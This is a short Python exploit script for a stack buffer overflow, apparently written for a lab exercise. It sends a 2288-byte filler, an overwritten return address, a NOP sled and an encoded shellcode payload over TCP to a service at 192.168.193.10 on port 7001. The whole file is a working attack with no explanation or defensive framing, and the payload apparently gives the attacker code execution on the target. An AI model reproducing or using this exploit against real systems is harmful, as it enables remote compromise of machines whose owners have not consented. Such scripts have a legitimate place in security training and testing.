#!/usr/bin/python
import socket

shellcode = (
"\xba\x6c\x7e\xbd\x71\xda\xc9\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x0e\x03\x3a\x70\x5f\x84\x3e\x64\x1d"
"\x67\xbe\x75\x42\xe1\x5b\x44\x42\x95\x28\xf7\x72\xdd\x7c\xf4"
"\xf9\xb3\x94\x8f\x8c\x1b\x9b\x38\x3a\x7a\x92\xb9\x17\xbe\xb5"
"\x39\x6a\x93\x15\x03\xa5\xe6\x54\x44\xd8\x0b\x04\x1d\x96\xbe"
"\xb8\x2a\xe2\x02\x33\x60\xe2\x02\xa0\x31\x05\x22\x77\x49\x5c"
"\xe4\x76\x9e\xd4\xad\x60\xc3\xd1\x64\x1b\x37\xad\x76\xcd\x09"
"\x4e\xd4\x30\xa6\xbd\x24\x75\x01\x5e\x53\x8f\x71\xe3\x64\x54"
"\x0b\x3f\xe0\x4e\xab\xb4\x52\xaa\x4d\x18\x04\x39\x41\xd5\x42"
"\x65\x46\xe8\x87\x1e\x72\x61\x26\xf0\xf2\x31\x0d\xd4\x5f\xe1"
"\x2c\x4d\x3a\x44\x50\x8d\xe5\x39\xf4\xc6\x08\x2d\x85\x85\x44"
"\x82\xa4\x35\x95\x8c\xbf\x46\xa7\x13\x14\xc0\x8b\xdc\xb2\x17"
"\xeb\xf6\x03\x87\x12\xf9\x73\x8e\xd0\xad\x23\xb8\xf1\xcd\xaf"
"\x38\xfd\x1b\x7f\x68\x51\xf4\xc0\xd8\x11\xa4\xa8\x32\x9e\x9b"
"\xc9\x3d\x74\xb4\x60\xc4\x1f\x7b\xdc\xb1\x1e\x13\x1f\x3d\xa0"
"\x5f\x96\xdb\xc8\x8f\xff\x74\x65\x29\x5a\x0e\x14\xb6\x70\x6b"
"\x16\x3c\x77\x8c\xd9\xb5\xf2\x9e\x8e\x35\x49\xfc\x19\x49\x67"
"\x68\xc5\xd8\xec\x68\x80\xc0\xba\x3f\xc5\x37\xb3\xd5\xfb\x6e"
"\x6d\xcb\x01\xf6\x56\x4f\xde\xcb\x59\x4e\x93\x70\x7e\x40\x6d"
"\x78\x3a\x34\x21\x2f\x94\xe2\x87\x99\x56\x5c\x5e\x75\x31\x08"
"\x27\xb5\x82\x4e\x28\x90\x74\xae\x99\x4d\xc1\xd1\x16\x1a\xc5"
"\xaa\x4a\xba\x2a\x61\xcf\xda\xc8\xa3\x3a\x73\x55\x26\x87\x1e"
"\x66\x9d\xc4\x26\xe5\x17\xb5\xdc\xf5\x52\xb0\x99\xb1\x8f\xc8"
"\xb2\x57\xaf\x7f\xb2\x7d")

try:
    print("\nSending evil buffer...")

    filler = "A" * 2288
    eip    = "\xcf\x10\x80\x14"   # 148010cf
    nops   = "\x90" * 16

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.193.10", 7001))
    s.send(filler + eip + nops + shellcode)

    s.close()

    print("\nDone!")

except:
    print("\nCould not connect!")
